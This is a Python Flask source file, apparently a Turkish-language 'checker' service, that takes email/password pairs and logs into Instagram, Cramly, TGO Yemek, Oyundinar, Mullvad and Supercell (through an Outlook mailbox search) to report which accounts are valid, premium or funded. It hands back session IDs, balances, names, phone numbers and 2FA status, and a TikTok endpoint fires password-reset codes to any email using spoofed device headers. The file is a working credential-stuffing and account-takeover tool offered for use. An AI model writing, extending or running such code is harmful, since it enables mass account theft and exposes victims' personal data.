from flask import Flask, request, jsonify
import requests
import time
from uuid import uuid4
import hashlib
import os
import re
from datetime import datetime
import random
import string
import json
import base64
import threading
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote

app = Flask(__name__)

# Global değişkenler
lock = threading.Lock()
stats = {
    'total_requests': 0,
    'successful_requests': 0,
    'failed_requests': 0
}

# Instagram Login API
@app.route('/api/instagram/login', methods=['GET'])
def instagram_login():
    try:
        username = request.args.get('username')
        password = request.args.get('password')
        user_ip = request.remote_addr
        
        if not username or not password:
            return jsonify({
                'status': 'error',
                'message': 'Username ve password parametreleri gereklidir'
            }), 400
        
        ud = str(uuid4())
        url = 'https://b.i.instagram.com/api/v1/accounts/login/'
        
        headers = {
            'Host': 'i.instagram.com',
            'X-Pigeon-Session-Id': '6509efe7-903a-473a-bc6c-c6e991b00863',
            'X-Pigeon-Rawclienttime': str(time.time()),
            'X-Ig-Connection-Speed': '-1kbps',
            'X-Ig-Bandwidth-Speed-Kbps': '-1.000',
            'X-Ig-Bandwidth-Totalbytes-B': '0',
            'X-Ig-Bandwidth-Totaltime-Ms': '0',
            'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
            'X-Ig-Connection-Type': 'WIFI',
            'X-Ig-Capabilities': '3brTvw==',
            'X-Ig-App-Id': '567067343352427',
            'User-Agent': 'Instagram 100.0.0.17.129 Android (28/9; 300dpi; 900x1600; Asus; ASUS_I003DD; ASUS_I003DD; intel; en_US; 161478664)',
            'Accept-Language': 'en-US',
            'Cookie': 'mid=ZVDJJAABAAF1siKcQXtdWVMgki95; csrftoken=jCYC9fu0Gt2BQrZKe4iyfGH2BienwPy1',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate, br',
            'X-Fb-Http-Engine': 'Liger',
            'Connection': 'keep-alive'
        }

        data = {
            "country_codes": "[{\"country_code\":\"1\",\"source\":[\"default\"]},{\"country_code\":\"964\",\"source\":[\"sim\"]}]",
            "phone_id": ud,
            "_csrftoken": "jCYC9fu0Gt2BQrZKe4iyfGH2BienwPy1",
            "username": username,
            "adid": ud,
            "guid": ud,
            "device_id": ud,
            "google_tokens": "[]",
            "password": password,
            "login_attempt_count": "0",
            'ig_sig_key_version': '4'
        }

        response = requests.post(url, headers=headers, data=data)
        
        if '"bad_password"' in response.text:
            return jsonify({
                'status': 'error',
                'message': 'Yanlış şifre',
                'code': 'BAD_PASSWORD',
                'user_ip': user_ip
            }), 401
        elif '"invalid_user"' in response.text:
            return jsonify({
                'status': 'error', 
                'message': 'Geçersiz kullanıcı',
                'code': 'INVALID_USER',
                'user_ip': user_ip
            }), 404
        elif '"checkpoint_challenge_required"' in response.text:
            return jsonify({
                'status': 'error',
                'message': 'Güvenlik doğrulaması gerekli',
                'code': 'CHECKPOINT_REQUIRED',
                'user_ip': user_ip
            }), 403
        elif 'Your account has been disabled' in response.text:
            return jsonify({
                'status': 'error',
                'message': 'Hesap askıya alındı',
                'code': 'ACCOUNT_DISABLED',
                'user_ip': user_ip
            }), 403
        elif '"two_factor_required"' in response.text:
            return jsonify({
                'status': 'error',
                'message': 'İki faktörlü doğrulama gerekli',
                'code': 'TWO_FACTOR_REQUIRED',
                'user_ip': user_ip
            }), 403
        elif '"status":"ok"' in response.text:
            cookies = response.cookies.get_dict()
            sessionid = cookies.get('sessionid', '')
            return jsonify({
                'status': 'success',
                'message': 'Giriş başarılı',
                'sessionid': sessionid,
                'username': username,
                'user_ip': user_ip
            }), 200
        else:
            return jsonify({
                'status': 'error',
                'message': 'Bilinmeyen hata',
                'user_ip': user_ip,
                'response': response.text[:200]
            }), 500
            
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'API hatası: {str(e)}',
            'user_ip': request.remote_addr
        }), 500

# TikTok Reset Email API
@app.route('/api/tiktok/reset', methods=['GET'])
def tiktok_reset():
    try:
        email = request.args.get('email')
        user_ip = request.remote_addr
        
        if not email:
            return jsonify({
                'status': 'error',
                'message': 'Email parametresi gereklidir',
                'user_ip': user_ip
            }), 400

        url = "https://api16-normal-c-alisg.tiktokv.com/passport/email/send_code/"
        
        params = {
            'passport-sdk-version': '19', 'iid': '7372613882915211014', 
            'device_id': '7372613015445308933', 'ac': 'wifi', 'channel': 'googleplay', 
            'aid': '1233', 'app_name': 'musical_ly', 'version_code': '310503', 
            'version_name': '31.5.3', 'device_platform': 'android', 'os': 'android', 
            'ab_version': '31.5.3', 'ssmix': 'a', 'device_type': 'SM-A505F', 
            'device_brand': 'samsung', 'language': 'tr', 'os_api': '29', 
            'os_version': '10', 'openudid': '47b07f1a42f3d962', 
            'manifest_version_code': '2023105030', 'resolution': '1080*2340', 
            'dpi': '420', 'update_version_code': '2023105030', 
            '_rticket': str(int(time.time() * 1000)), 'is_pad': '0', 
            'app_type': 'normal', 'sys_region': 'TR', 'mcc_mnc': '28601', 
            'timezone_name': 'Europe/Istanbul', 'carrier_region_v2': '286', 
            'app_language': 'tr', 'carrier_region': 'TR', 'ac2': 'wifi', 
            'uoo': '1', 'op_region': 'TR', 'timezone_offset': '10800', 
            'build_number': '31.5.3', 'host_abi': 'arm64-v8a', 'locale': 'tr', 
            'region': 'TR', 'ts': str(int(time.time())), 
            'cdid': '10f6e4d6-16f9-4a03-a021-4375a1c072c8', 'support_webview': '1', 
            'reg_store_region': 'tr', 'cronet_version': '2fdb62f9_2023-09-06', 
            'ttnet_version': '4.2.152.11-tiktok', 'use_store_region_cookie': '1'
        }
        
        payload = f"rules_version=v2&account_sdk_source=app&multi_login=1&type=31&email={email}&mix_mode=1"
        
        headers = {
            'User-Agent': 'com.zhiliaoapp.musically/2023105030 (Linux; U; Android 10; tr_TR; ART-L29N; Build/HUAWEIART-L29N; Cronet/TTNetVersion:2fdb62f9 2023-09-06 QuicVersion:bb24d47c 2023-07-19)',
            'Content-Type': 'application/x-www-form-urlencoded',
            'sdk-version': '2',
            'x-ss-req-ticket': str(int(time.time() * 1000)),
            'x-tt-passport-csrf-token': '24a8c5234188c87c654cf17f2ee2dc70',
            'passport-sdk-version': '19',
            'x-tt-dm-status': 'login=0;ct=1;rt=6',
            'x-tt-bypass-dp': '1',
            'x-vc-bdturing-sdk-version': '2.3.3.i18n',
            'x-ss-stub': '8CC81EE0FB32631749A8267BEB4F3249',
            'x-tt-trace-id': '00-ab947041106650c879cc0a06053304d1-ab947041106650c8-01',
            'x-argus': '43ezL+yAGAg/ntTuU/ujVA8I1E6tQEh2+Ay9fZ8xSJzIxShzJLdOIp1oZSMcTmTd79DKgYvYG3Y6EJHQw0hRl3ptm+MgzlmjKohIZsPGftz0AudftXdILG3SqIRh7R4+Kzs+vcYKR/dal+lnAhKgTRRfxYDDBVHNB7kpiQEOkH915AYJ1uF8qGO3uZTHfElq8kc94HsCZBDWv5ZZ6vOB3hPbgc/dLzjxLir837B5Jpe4OllaKgN3L5v3WC+2JJn/VTMk81UwfNSH8l7p7NnIbXJd6m59h9IFWgomPpqEpOhlu+ROhJuWmJ5FS3lZJrPBK0h3mlYhNJbKxRgIaeylVZkljvuFZ8fwPxvog2U6obOSEXQATIjZMhT+BoSTcvpdGn/P55O9J3IR/0hlDwzx3Sp3/xqsfp8l/QmArv4ha70TG1by0QDdvXAfBzs/JJZQ9qku/JAZnYfgXoPfrhQbdwjJf2Gmj8XphbcKIp/oEUzSOs5Fjc3pbRgfLVBPbTf/0yEVGlwv4VblaBxOsAaqJuRY',
            'x-gorgon': '84040039000073c5d5fa441990245151415451f12ba24072b6e4',
            'x-khronos': str(int(time.time())),
            'x-ladon': 'DOCmYT1SFgBtXIky8cBH+g/ymcAe+237nMdEAu2IPa2oUq7O'
        }

        session = requests.Session()
        response = session.post(url, params=params, data=payload, headers=headers)
        
        return jsonify({
            'status': 'success',
            'message': 'TikTok reset kodu gönderildi',
            'email': email,
            'user_ip': user_ip,
            'response': response.text
        }), 200
        
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'TikTok API hatası: {str(e)}',
            'user_ip': request.remote_addr
        }), 500

# Cramly Checker API
@app.route('/api/cramly/check', methods=['GET'])
def cramly_check():
    try:
        email = request.args.get('email')
        password = request.args.get('password')
        user_ip = request.remote_addr
        
        if not email or not password:
            return jsonify({
                'status': 'error',
                'message': 'Email ve password parametreleri gereklidir',
                'user_ip': user_ip
            }), 400

        firebase_url = "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyC9z3MVVzFN8J9jQ6zNFIyb4Q2hQQv_8pQ"
        settings_url = "https://api.cramly.ai/settings/{}"

        headers_login = {
            "accept": "*/*",
            "accept-language": "fr-FR,fr;q=0.5",
            "content-type": "application/json",
            "origin": "https://app.cramly.ai",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
            "x-client-version": "Chrome/JsCore/9.15.0/FirebaseCore-web",
        }

        payload = {"returnSecureToken": True, "email": email, "password": password}

        r = requests.post(firebase_url, headers=headers_login, json=payload, timeout=15)
        if any(err in r.text for err in ["EMAIL_NOT_FOUND", "INVALID_PASSWORD", "400"]):
            return jsonify({
                'status': 'error',
                'message': 'Geçersiz hesap',
                'email': email,
                'user_ip': user_ip
            }), 401

        data = r.json()
        token = data.get("idToken")
        if not token:
            return jsonify({
                'status': 'error',
                'message': 'Token alınamadı',
                'email': email,
                'user_ip': user_ip
            }), 401

        payload_b64 = token.split(".")[1]
        payload_b64 += "=" * (-len(payload_b64) % 4)
        decoded = json.loads(base64.urlsafe_b64decode(payload_b64).decode())
        user_id = decoded.get("user_id")

        headers_settings = {
            "accept": "application/json, text/plain, */*",
            "authorization": f"Bearer {token}",
            "origin": "https://app.cramly.ai",
            "referer": "https://app.cramly.ai/",
            "user-agent": headers_login["user-agent"],
        }

        r2 = requests.get(settings_url.format(user_id), headers=headers_settings, timeout=15)
        if r2.status_code != 200:
            return jsonify({
                'status': 'error',
                'message': 'Hesap bilgileri alınamadı',
                'email': email,
                'user_ip': user_ip
            }), 401

        sdata = r2.json()
        plan = sdata.get("billingStatus", "Unknown")
        status = sdata.get("state", "Unknown")
        rewrite = sdata.get("rewriteTester", "Unknown")

        return jsonify({
            'status': 'success',
            'message': 'Hesap geçerli',
            'email': email,
            'user_ip': user_ip,
            'plan': plan,
            'account_status': status,
            'rewrite_tester': rewrite
        }), 200

    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Cramly API hatası: {str(e)}',
            'user_ip': request.remote_addr
        }), 500

# TGO Yemek Checker API
@app.route('/api/tgoyemek/check', methods=['GET'])
def tgoyemek_check():
    try:
        username = request.args.get('username')
        password = request.args.get('password')
        user_ip = request.remote_addr
        
        if not username or not password:
            return jsonify({
                'status': 'error',
                'message': 'Username ve password parametreleri gereklidir',
                'user_ip': user_ip
            }), 400

        # TGO Yemek login işlemi
        session = requests.Session()
        
        # İlk istek
        url1 = "https://tgoyemek.com/api/auth/login"
        headers1 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
            'Content-Type': 'application/json'
        }
        
        response1 = session.post(url1, headers=headers1, json={})
        cookies1 = session.cookies.get_dict()
        
        # İkinci istek
        url2 = "https://tgoyemek.com/giris?callbackUrl=%2F"
        response2 = session.get(url2, headers=headers1)
        cookies2 = session.cookies.get_dict()
        
        # Login isteği
        url3 = "https://tgoyemek.com/api/auth/login"
        headers3 = headers1.copy()
        headers3.update({
            'Content-Type': 'text/plain;charset=UTF-8',
            'Origin': 'https://tgoyemek.com',
            'Referer': 'https://tgoyemek.com/giris?callbackUrl=%2F',
        })
        
        csrf_token = cookies2.get('tgo-pid', '')
        login_data = {
            "username": username,
            "password": password,
            "csrfToken": csrf_token
        }
        
        response3 = session.post(url3, headers=headers3, json=login_data)
        
        if "E-posta adresiniz ve/veya şifreniz hatalı" in response3.text:
            return jsonify({
                'status': 'error',
                'message': 'Hatalı kullanıcı adı/şifre',
                'username': username,
                'user_ip': user_ip
            }), 401
        
        login_response = response3.json()
        access_token = login_response.get('access_token', '')
        
        if not access_token:
            return jsonify({
                'status': 'success',
                'message': 'Ücretsiz hesap',
                'username': username,
                'user_ip': user_ip,
                'account_type': 'FREE'
            }), 200
        
        # Kullanıcı bilgilerini al
        url4 = "https://api.tgoapis.com/web-user-apimemberuser-santral/user"
        headers4 = headers1.copy()
        headers4.update({
            'authorization': f'Bearer {access_token}',
            'pid': csrf_token,
            'sid': cookies2.get('tgo-sid', '')
        })
        
        response4 = session.get(url4, headers=headers4)
        user_data = response4.json()
        
        return jsonify({
            'status': 'success',
            'message': 'Premium hesap',
            'username': username,
            'user_ip': user_ip,
            'account_type': 'PREMIUM',
            'user_info': {
                'email': user_data.get('email'),
                'first_name': user_data.get('firstName'),
                'last_name': user_data.get('lastName'),
                'phone': user_data.get('phoneNumber'),
                'is_2fa': user_data.get('is2faActive', False)
            }
        }), 200

    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'TGO Yemek API hatası: {str(e)}',
            'user_ip': request.remote_addr
        }), 500

# Oyundinar Checker API
@app.route('/api/oyundinar/check', methods=['GET'])
def oyundinar_check():
    try:
        email = request.args.get('email')
        password = request.args.get('password')
        user_ip = request.remote_addr
        
        if not email or not password:
            return jsonify({
                'status': 'error',
                'message': 'Email ve password parametreleri gereklidir',
                'user_ip': user_ip
            }), 400

        headers_base = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*"
        }

        with requests.Session() as session:
            r1 = session.get("https://www.oyundinar.com/login/loginClient", headers=headers_base, timeout=10)
            csrf_cookie_name = session.cookies.get("csrf_cookie_name", "")
            ci_session = session.cookies.get("ci_session", "")

            r2 = session.get("https://www.oyundinar.com/hesap", headers=headers_base, timeout=10)
            match_csrf = re.search(r'type="hidden" name="csrf_test_name" value="(.+?)"', r2.text)
            csrf_test_name = match_csrf.group(1) if match_csrf else ""

            login_data = {
                "csrf_test_name": csrf_test_name,
                "mail": email,
                "password": password,
                "btn+btn-primary+w-100": "Giriş Yap"
            }
            post_headers = {
                "content-type": "application/x-www-form-urlencoded",
                "cookie": f"theme=dark; ci_session={ci_session}; csrf_cookie_name={csrf_cookie_name}",
                "origin": "https://www.oyundinar.com",
                "referer": "https://www.oyundinar.com/hesap",
                "User-Agent": headers_base["User-Agent"]
            }
            r3 = session.post("https://www.oyundinar.com/login/loginClient",
                              data=login_data, headers=post_headers, timeout=10)

            if "Bilgiler Geçerli Değil" in r3.text or "Alanı boş bırakılamaz" in r3.text or "E-mail adresi geçerli değil." in r3.text:
                return jsonify({
                    'status': 'error',
                    'message': 'Geçersiz giriş bilgileri',
                    'email': email,
                    'user_ip': user_ip
                }), 401

            r4 = session.get("https://www.oyundinar.com/client",
                              headers={
                                  "User-Agent": headers_base["User-Agent"],
                                  "cookie": f"ci_session={ci_session}; theme=light; csrf_cookie_name={csrf_cookie_name}"
                              }, timeout=10)
            match_balance = re.search(r'<div class="money">Bakiye:(.+?)</div>', r4.text)
            bakiye = match_balance.group(1).strip() if match_balance else "Bulunamadı"

            if bakiye == "Bulunamadı":
                return jsonify({
                    'status': 'error',
                    'message': 'Bakiye bilgisi alınamadı',
                    'email': email,
                    'user_ip': user_ip
                }), 401

            return jsonify({
                'status': 'success',
                'message': 'Hesap geçerli',
                'email': email,
                'user_ip': user_ip,
                'balance': bakiye
            }), 200

    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Oyundinar API hatası: {str(e)}',
            'user_ip': request.remote_addr
        }), 500

# Mullvad Checker API
@app.route('/api/mullvad/check', methods=['GET'])
def mullvad_check():
    try:
        username = request.args.get('username')
        password = request.args.get('password')
        user_ip = request.remote_addr
        
        if not username or not password:
            return jsonify({
                'status': 'error',
                'message': 'Username ve password parametreleri gereklidir',
                'user_ip': user_ip
            }), 400

        session = requests.Session()
        session.verify = False

        headers = {
            'accept': 'application/json',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'tr,en-US;q=0.9,en;q=0.8,ru;q=0.7,de;q=0.6,pl;q=0.5,nl;q=0.4,fr;q=0.3,ar;q=0.2,sl;q=0.1,es;q=0.1,it;q=0.1,zh-TW;q=0.1,zh;q=0.1,el;q=0.1,th;q=0.1,id;q=0.1',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://mullvad.net',
            'priority': 'u=1, i',
            'referer': 'https://mullvad.net/tr/account/login',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Opera GX";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 OPR/122.0.0.0',
            'x-sveltekit-action': 'true'
        }
        
        # İlk POST isteği - username ile
        data_user = f'account_number={username}'
        response1 = session.post(
            'https://mullvad.net/tr/account/login',
            headers=headers,
            data=data_user,
            timeout=30,
            allow_redirects=True
        )
        
        user_response = response1.text
        
        # İkinci POST isteği - password ile
        data_pass = f'account_number={password}'
        response2 = session.post(
            'https://mullvad.net/tr/account/login',
            headers=headers,
            data=data_pass,
            timeout=30,
            allow_redirects=True
        )
        
        pass_response = response2.text
        
        # Başarı kontrolü
        success = False
        if ('/tr/account' in user_response and '/tr/account' in pass_response):
            success = True
        elif ('status":302' in user_response and 'status":302' in pass_response):
            success = True
        elif ('/tr/account' in user_response or '/tr/account' in pass_response):
            if ('status":302' in user_response or 'status":302' in pass_response):
                success = True
        
        if not success:
            return jsonify({
                'status': 'error',
                'message': 'Geçersiz hesap',
                'username': username,
                'user_ip': user_ip
            }), 401

        # Access token'ı al
        access_token = None
        cookies = session.cookies.get_dict()
        
        if 'accessToken' in cookies:
            access_token = cookies['accessToken']
        
        if not access_token:
            return jsonify({
                'status': 'success',
                'message': 'Ücretsiz hesap',
                'username': username,
                'user_ip': user_ip,
                'account_type': 'FREE'
            }), 200
        
        # Hesap sayfasını çek
        headers['cookie'] = f'accessToken={access_token}'
        response3 = session.get(
            'https://mullvad.net/tr/account',
            headers=headers,
            timeout=30
        )
        
        account_page = response3.text
        
        # FREE kontrolü
        if 'Süre sona erdi' in account_page or 'SÃƒÂ¼re sona erdi' in account_page:
            return jsonify({
                'status': 'success',
                'message': 'Ücretsiz hesap',
                'username': username,
                'user_ip': user_ip,
                'account_type': 'FREE'
            }), 200
        
        # Bitiş tarihini çıkar
        expiry_date = "Bulunamadı"
        try:
            if 'account-expiry"' in account_page:
                start_pos = account_page.find('account-expiry"')
                if start_pos != -1:
                    chunk = account_page[start_pos:start_pos + 500]
                    
                    if 'class="svelte-yh0gsb">' in chunk and '</time>' in chunk:
                        date_start = chunk.find('class="svelte-yh0gsb">') + len('class="svelte-yh0gsb">')
                        date_end = chunk.find('</time>', date_start)
                        
                        if date_end != -1 and date_start < date_end:
                            expiry_date = chunk[date_start:date_end].strip()
                            expiry_date = expiry_date.replace('<', '').replace('>', '')
        except Exception:
            pass
        
        return jsonify({
            'status': 'success',
            'message': 'Premium hesap',
            'username': username,
            'user_ip': user_ip,
            'account_type': 'PREMIUM',
            'expiry_date': expiry_date
        }), 200

    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Mullvad API hatası: {str(e)}',
            'user_ip': request.remote_addr
        }), 500

# Supercell Checker API
@app.route('/api/supercell/check', methods=['GET'])
def supercell_check():
    try:
        email = request.args.get('email')
        password = request.args.get('password')
        user_ip = request.remote_addr
        
        if not email or not password:
            return jsonify({
                'status': 'error',
                'message': 'Email ve password parametreleri gereklidir',
                'user_ip': user_ip
            }), 400

        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 9; V2218A Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'tr-TR',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        
        url = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={quote(email)}&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&mkt=tr&response_type=code&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
        cevap = session.get(url)
        
        if 'IfExistsResult\":1' in cevap.text:
            return jsonify({
                'status': 'error',
                'message': 'Hesap bulunamadı',
                'email': email,
                'user_ip': user_ip
            }), 404
            
        PPFT = re.search(r'name="PPFT" id="i0327" value="(.*?)"', cevap.text)
        if not PPFT:
            return jsonify({
                'status': 'error',
                'message': 'PPFT alınamadı',
                'email': email,
                'user_ip': user_ip
            }), 500
            
        PPFT = PPFT.group(1)
        urlpost = re.search(r"urlPost:'(.*?)'", cevap.text)
        if not urlpost:
            return jsonify({
                'status': 'error',
                'message': 'urlPost alınamadı',
                'email': email,
                'user_ip': user_ip
            }), 500
            
        urlpost = urlpost.group(1)
        veri = {
            'i13': '1',
            'login': email,
            'loginfmt': email,
            'type': '11',
            'LoginOptions': '1',
            'passwd': password,
            'ps': '2',
            'PPFT': PPFT,
            'PPSX': 'Passport',
            'NewUser': '1',
            'fspost': '0',
            'i21': '0',
            'CookieDisclosure': '0',
            'IsFidoSupported': '0',
            'isSignupPost': '0',
            'isRecoveryAttemptPost': '0',
            'i19': '3772'
        }
        
        cevap2 = session.post(urlpost, data=veri, allow_redirects=False)
        if 'https://login.live.com/ppsecure/post.srf' not in cevap2.text and 'Location' not in cevap2.headers:
            return jsonify({
                'status': 'error',
                'message': 'Geçersiz giriş',
                'email': email,
                'user_ip': user_ip
            }), 401
            
        if 'Location' in cevap2.headers:
            kod = re.search(r'code=(.*?)&', cevap2.headers['Location'])
            if not kod:
                return jsonify({
                    'status': 'error',
                    'message': 'Kod alınamadı',
                    'email': email,
                    'user_ip': user_ip
                }), 500
                
            kod = kod.group(1)
            tokenverisi = {
                'client_info': '1',
                'client_id': 'e9b154d0-7658-433b-bb25-6b8e0a8a7c59',
                'redirect_uri': 'msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D',
                'grant_type': 'authorization_code',
                'code': kod,
                'scope': 'profile openid offline_access https://outlook.office.com/M365.Access'
            }
            basliklar = {
                'Host': 'login.microsoftonline.com',
                'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
                'User-Agent': 'Mozilla/5.0 (compatible; MSAL 1.0)',
                'x-client-Ver': '1.0.0+635e350c',
                'x-client-OS': '28',
                'x-client-SKU': 'MSAL.xplat.android',
            }
            cevap3 = session.post('https://login.microsoftonline.com/consumers/oauth2/v2.0/token', data=tokenverisi, headers=basliklar)
            if 'access_token' not in cevap3.text:
                return jsonify({
                    'status': 'error',
                    'message': 'Token alınamadı',
                    'email': email,
                    'user_ip': user_ip
                }), 500
                
            token = cevap3.json()['access_token']
            cid = ''
            for c in session.cookies:
                if c.name == 'MSPCID':
                    cid = c.value.upper()
                    break
                    
            mailbaslik = {
                'User-Agent': 'Outlook-Android/2.0',
                'Authorization': f'Bearer {token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Accept': 'application/json',
            }
            veri = {
                "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "Turkey Standard Time",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {
                        "Or": [
                            {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                            {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                        ]
                    },
                    "From": 0,
                    "Query": {"QueryString": "noreply@id.supercell.com"},
                    "Size": 25,
                    "Sort": [
                        {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                        {"Field": "Time", "SortDirection": "Desc"}
                    ],
                    "EnableTopResults": True,
                    "TopResultsCount": 3
                }],
                "AnswerEntityRequests": [{
                    "Query": {"QueryString": "noreply@id.supercell.com"},
                    "EntityTypes": ["Event", "File"],
                    "From": 0,
                    "Size": 10,
                    "EnableAsyncResolution": True
                }],
                "QueryAlterationOptions": {
                    "EnableSuggestion": True,
                    "EnableAlteration": True,
                    "SupportedRecourseDisplayTypes": [
                        "Suggestion",
                        "NoResultModification",
                        "NoResultFolderRefinerModification",
                        "NoRequeryModification",
                        "Modification"
                    ]
                },
                "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c"
            }
            mailbaslik['Content-Type'] = 'application/json'
            cevap4 = session.post('https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124', json=veri, headers=mailbaslik)
            veritext = json.dumps(cevap4.json())
            oyunlar = {
                'Clash Royale': '✔️' if 'Clash Royale' in veritext else '❌',
                'Brawl Stars': '✔️' if 'Brawl Stars' in veritext else '❌',
                'Clash of Clans': '✔️' if 'Clash of Clans' in veritext else '❌',
                'Hay Day': '✔️' if 'Hay Day' in veritext else '❌'
            }

            return jsonify({
                'status': 'success',
                'message': 'Supercell hesabı geçerli',
                'email': email,
                'user_ip': user_ip,
                'games': oyunlar
            }), 200

    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Supercell API hatası: {str(e)}',
            'user_ip': request.remote_addr
        }), 500

# API İstatistikleri
@app.route('/api/stats', methods=['GET'])
def api_stats():
    with lock:
        return jsonify({
            'status': 'success',
            'total_requests': stats['total_requests'],
            'successful_requests': stats['successful_requests'],
            'failed_requests': stats['failed_requests'],
            'success_rate': (stats['successful_requests'] / stats['total_requests'] * 100) if stats['total_requests'] > 0 else 0
        })

# Ana Sayfa
@app.route('/')
def home():
    user_ip = request.remote_addr
    return jsonify({
        'message': '🚀 NABISYSTEM MULTI-API SERVİSİ',
        'version': '6.0',
        'developer': 'NABISYSTEM',
        'user_ip': user_ip,
        'endpoints': {
            '/api/instagram/login': 'GET - Instagram Giriş (username, password)',
            '/api/tiktok/reset': 'GET - TikTok Şifre Sıfırlama (email)',
            '/api/cramly/check': 'GET - Cramly Checker (email, password)',
            '/api/tgoyemek/check': 'GET - TGO Yemek Checker (username, password)',
            '/api/oyundinar/check': 'GET - Oyundinar Checker (email, password)',
            '/api/mullvad/check': 'GET - Mullvad Checker (username, password)',
            '/api/supercell/check': 'GET - Supercell Checker (email, password)',
            '/api/stats': 'GET - API İstatistikleri'
        }
    })

# Middleware - Tüm istekleri logla
@app.before_request
def before_request():
    with lock:
        stats['total_requests'] += 1

@app.after_request
def after_request(response):
    if response.status_code == 200:
        with lock:
            stats['successful_requests'] += 1
    else:
        with lock:
            stats['failed_requests'] += 1
    return response

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
